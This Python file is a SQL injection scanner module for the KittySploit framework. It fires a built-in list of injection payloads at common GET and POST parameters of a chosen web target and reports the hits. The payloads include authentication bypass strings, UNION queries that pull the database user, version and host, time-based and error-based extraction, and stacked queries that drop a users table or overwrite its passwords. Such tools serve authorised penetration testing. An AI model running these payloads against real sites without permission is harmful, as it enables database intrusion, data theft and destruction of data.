#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import time
import re


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'SQL Injection Scanner',
        'description': 'Scans for SQL injection vulnerabilities including union-based, boolean-based, time-based, and error-based SQL injection',
        'author': 'KittySploit Team',
        'tags': ['web', 'sqli', 'sql', 'injection', 'scanner', 'security'],
        'references': [
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://portswigger.net/web-security/sql-injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
        ]
    }

    # SQL injection payloads
    SQLI_PAYLOADS = [
        # Basic SQL injection
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "') OR ('1'='1'/*",
        "' OR 'a'='a",
        "') OR ('a'='a",
        
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT @@version,@@datadir,@@hostname--",
        
        # Boolean-based blind
        "' OR 1=1 AND 'a'='a",
        "' OR 1=1 AND 'a'='b",
        "' OR 1=2 AND 'a'='a",
        "' AND 1=1--",
        "' AND 1=2--",
        
        # Time-based blind
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "'; SELECT BENCHMARK(5000000,MD5(1))--",
        
        # Error-based
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; UPDATE users SET password='hacked'--",
        
        # Second-order SQL injection
        "admin'--",
        "admin'/*",
        "admin'#",
    ]

    # Parameter names commonly used
    COMMON_PARAMS = [
        'id', 'user', 'user_id', 'username', 'email', 'password',
        'q', 'query', 'search', 'filter', 'sort', 'order',
        'page', 'limit', 'offset', 'count',
        'category', 'category_id', 'tag', 'tag_id',
        'name', 'value', 'data', 'input', 'param',
    ]

    def check(self):
        """
        Check if the target is accessible
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response and response.status_code in [200, 301, 302, 403, 404, 401]:
                return True
            return False
        except Exception as e:
            return False

    @staticmethod
    def _evidence_snippet(response_text: str, matched_substring: str, radius: int = 140) -> str:
        """Short excerpt around the first DB error match (for reports / agent)."""
        if not response_text:
            return ""
        text = response_text
        low = text.lower()
        needle = (matched_substring or "").lower()
        if needle and needle in low:
            i = low.index(needle)
            a = max(0, i - radius)
            b = min(len(text), i + len(needle) + radius)
            frag = text[a:b].replace("\n", " ").replace("\r", " ")
            return frag.strip()[:900]
        return text.replace("\n", " ")[:400].strip()

    def _format_request_url(self, path: str) -> str:
        try:
            def _gv(opt):
                if hasattr(opt, "value"):
                    return opt.value
                return opt

            target = _gv(self.target)
            port = int(_gv(self.port))
            protocol = "http"
            if hasattr(self, "ssl"):
                protocol = "https" if self._to_bool(_gv(self.ssl)) else "http"
            elif port == 443:
                protocol = "https"
            p = path if str(path).startswith("/") else f"/{path}"
            return f"{protocol}://{target}:{port}{p}"
        except Exception:
            return str(path or "/")

    def test_sqli_payload(self, payload, param_name='id', method='GET'):
        """
        Test a SQL injection payload
        
        Args:
            payload: The SQL injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            test_path = "/"
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                
                start_time = time.time()
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            else:
                post_data = {param_name: payload}
                test_path = "/"
                start_time = time.time()
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time

            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}

            is_vulnerable = False
            indicators = []
            injection_type = None

            # Strong DB/driver error strings (avoid generic words like "mysql" alone — too noisy on normal pages).
            sql_errors = [
                'sql syntax',
                'sqlite exception',
                'sqlite3.operationalerror',
                'warning: mysql',
                'mysqli_',
                'mysql_fetch',
                'mysqli_sql_exception',
                'postgresql query failed',
                'warning: pg_',
                'pg_query(',
                'pg_exec(',
                'unclosed quotation',
                'quoted string not properly terminated',
                'microsoft ole db provider for sql',
                'odbc sql server driver',
                'ora-0',
                'oracle error',
                'sql server',
                'sqlstate[',
                'syntax error near',
                'you have an error in your sql',
            ]

            response_text = response.text or ""
            response_lower = response_text.lower()
            matched_error_token = ""
            for error in sql_errors:
                if error in response_lower:
                    is_vulnerable = True
                    injection_type = 'Error-based'
                    matched_error_token = error
                    indicators.append(f'SQL error: {error}')
                    break

            if 'sleep' in payload.lower() or 'waitfor' in payload.lower() or 'pg_sleep' in payload.lower() or 'benchmark' in payload.lower():
                if elapsed_time > 4:
                    is_vulnerable = True
                    injection_type = 'Time-based'
                    indicators.append(f'Time-based delay: {elapsed_time:.2f}s')

            # Union: only flag when an error-based signal already matched (union alone on a marketing page is FP-heavy).
            if (
                'union' in payload.lower()
                and 'select' in payload.lower()
                and response.status_code == 200
                and len(response_text) > 100
                and is_vulnerable
                and injection_type == 'Error-based'
            ):
                injection_type = 'Union-based (error in response)'
                indicators.append('UNION payload used; error-based evidence present')

            if method == "GET":
                request_url = self._format_request_url(test_path)
            else:
                base = self._format_request_url("/")
                pl_show = payload.replace("\n", "\\n")[:80]
                request_url = f"{base} [POST {param_name}={pl_show!r}]"

            evidence_snippet = ""
            if is_vulnerable:
                if injection_type in ('Error-based', 'Union-based (error in response)') and matched_error_token:
                    evidence_snippet = self._evidence_snippet(response_text, matched_error_token)
                elif injection_type == 'Time-based':
                    evidence_snippet = (
                        f"time_delay_s={elapsed_time:.2f}; status={response.status_code}; "
                        f"body_len={len(response_text)}"
                    )

            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'request_path': test_path,
                'request_url': request_url,
                'vulnerable': is_vulnerable,
                'injection_type': injection_type,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_time': elapsed_time,
                'response_length': len(response_text),
                'evidence_snippet': evidence_snippet,
                'matched_error_token': matched_error_token,
            }

        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the SQL injection scan
        """
        self.vulnerabilities = []
        self.test_results = []
        self.vulnerability_info = {}

        if not self.check():
            print_error("Target is not reachable, aborting SQL injection scan.")
            self.vulnerability_info = {
                "reason": "Target is not reachable",
                "severity": "Info",
            }
            return False
        
        print_status("Starting SQL injection scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Test GET parameters
        print_status("Testing GET parameters for SQL injection...")
        print_info("")
        
        sqli_print_keys = set()
        sqli_live_cap = 48
        sqli_live_printed = 0
        
        for param in self.COMMON_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.SQLI_PAYLOADS[:20], 1):  # Test first 20 payloads per param
                result = self.test_sqli_payload(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    self.vulnerabilities.append(result)
                    key = ("GET", param)
                    if key in sqli_print_keys or sqli_live_printed >= sqli_live_cap:
                        continue
                    sqli_print_keys.add(key)
                    sqli_live_printed += 1
                    pl_show = payload if len(payload) <= 100 else (payload[:97] + "…")
                    rt = result.get("response_time")
                    rt_s = f" | t={rt:.2f}s" if isinstance(rt, (int, float)) else ""
                    inds = ", ".join(result.get("indicators") or [])[:400]
                    print_success(
                        f"[!] Potential SQLi | GET {result.get('request_url', '')} "
                        f"| param={param} | {result.get('injection_type', 'Unknown')} "
                        f"| status={result.get('status_code')} | len={result.get('response_length')} "
                        f"| payload={pl_show!r}{rt_s}"
                    )
                    if inds:
                        print_success(f"    indicators: {inds}")
                    ev = (result.get("evidence_snippet") or "").strip()
                    if ev:
                        print_success(f"    evidence: {ev[:700]}{'…' if len(ev) > 700 else ''}")
        
        print_info("")
        
        # Test POST parameters
        print_status("Testing POST parameters for SQL injection...")
        print_info("")
        
        for param in self.COMMON_PARAMS[:10]:  # Test first 10 params via POST
            print_info(f"Testing POST parameter: {param}")
            
            for payload in self.SQLI_PAYLOADS[:15]:  # Test first 15 payloads
                result = self.test_sqli_payload(payload, param, method='POST')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    self.vulnerabilities.append(result)
                    key = ("POST", param)
                    if key in sqli_print_keys or sqli_live_printed >= sqli_live_cap:
                        continue
                    sqli_print_keys.add(key)
                    sqli_live_printed += 1
                    pl_show = payload if len(payload) <= 100 else (payload[:97] + "…")
                    rt = result.get("response_time")
                    rt_s = f" | t={rt:.2f}s" if isinstance(rt, (int, float)) else ""
                    inds = ", ".join(result.get("indicators") or [])[:400]
                    print_success(
                        f"[!] Potential SQLi | POST {result.get('request_url', '')} "
                        f"| param={param} | {result.get('injection_type', 'Unknown')} "
                        f"| status={result.get('status_code')} | len={result.get('response_length')} "
                        f"| payload={pl_show!r}{rt_s}"
                    )
                    if inds:
                        print_success(f"    indicators: {inds}")
                    ev = (result.get("evidence_snippet") or "").strip()
                    if ev:
                        print_success(f"    evidence: {ev[:700]}{'…' if len(ev) > 700 else ''}")
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("SQL Injection Scan Summary")
        print_status("=" * 60)
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("SQL Injection vulnerabilities detected:")
            print_info("")
            
            # Group by injection type
            by_type = {}
            for vuln in self.vulnerabilities:
                inj_type = vuln.get('injection_type', 'Unknown')
                if inj_type not in by_type:
                    by_type[inj_type] = []
                by_type[inj_type].append(vuln)
            
            for inj_type, vulns in by_type.items():
                print_info(f"{inj_type} SQL Injection ({len(vulns)} found):")
                table_data = []
                for vuln in vulns[:10]:  # Show first 10 per type
                    payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                    indicators = ', '.join(vuln.get('indicators', [])[:2])
                    req = str(vuln.get('request_url') or '')[:96]
                    ev = (vuln.get('evidence_snippet') or '')[:64]
                    table_data.append([
                        vuln.get('param', 'N/A'),
                        vuln.get('method', 'GET'),
                        req,
                        payload_short,
                        indicators,
                        ev,
                    ])
                
                if table_data:
                    print_table(
                        ['Parameter', 'Method', 'URL', 'Payload', 'Indicators', 'Evidence'],
                        table_data,
                    )
                print_info("")
            
            print_warning("IMPORTANT: These are potential vulnerabilities. Manual verification with tools like SQLMap is required.")
        else:
            print_info("No SQL injection vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")

        # Scanner / agent: structured result (message + details) for reports and LLM context
        if self.vulnerabilities:
            seen = set()
            hits_out = []
            for v in self.vulnerabilities:
                key = (v.get("method"), v.get("param"))
                if key in seen:
                    continue
                seen.add(key)
                hits_out.append({
                    "param": v.get("param"),
                    "method": v.get("method"),
                    "request_url": v.get("request_url"),
                    "injection_type": v.get("injection_type"),
                    "payload": v.get("payload"),
                    "indicators": v.get("indicators") or [],
                    "status_code": v.get("status_code"),
                    "response_length": v.get("response_length"),
                    "response_time_s": v.get("response_time"),
                    "evidence_snippet": (v.get("evidence_snippet") or "")[:2000],
                })
                if len(hits_out) >= 24:
                    break

            first = hits_out[0]
            summary = (
                f"{first.get('injection_type', 'SQLi')} on param={first.get('param')} "
                f"({first.get('method')}) — {first.get('request_url', '')[:180]}"
            )
            self.vulnerability_info = {
                "reason": f"Potential SQL injection: {summary}",
                "severity": "High",
                "sqli_findings": hits_out,
                "sqli_hit_count": len(self.vulnerabilities),
            }
            return True

        return False
